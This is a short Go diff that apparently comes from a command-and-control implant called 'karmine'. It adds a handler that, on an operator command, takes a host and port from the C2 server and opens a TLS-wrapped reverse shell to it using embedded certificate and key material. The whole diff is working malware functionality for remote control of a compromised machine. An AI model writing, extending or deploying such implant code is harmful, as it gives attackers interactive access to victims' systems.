@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io/fs"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -19,6 +20,7 @@ import (
 
 	"github.com/pygrum/karmine/client"
 	ex "github.com/pygrum/karmine/karma/cmd/exec"
+	"github.com/pygrum/karmine/karma/cmd/revshell"
 	"github.com/pygrum/karmine/krypto/kes"
 	"github.com/pygrum/karmine/krypto/kryptor"
 	"github.com/pygrum/karmine/models"
@@ -186,6 +188,21 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 			objType = 1
 			responseObject.Code = 1
 			responseObject.Data.Error = err.Error()
+		}
+	case 4:
+		if len(args) != 2 {
+			return
+		}
+		conf, err := client.TLSDialConfig(certData, keyData, kX1, kX2)
+		if err != nil {
+			return
+		}
+		err = revshell.Do(net.JoinHostPort(args[0].StrValue, args[1].StrValue), conf)
+		if err != nil {
+			responseObject.Code = 1
+			responseObject.Data.Error = err.Error()
+		} else {
+			return
 		}
 	}
 	if objType == 1 {
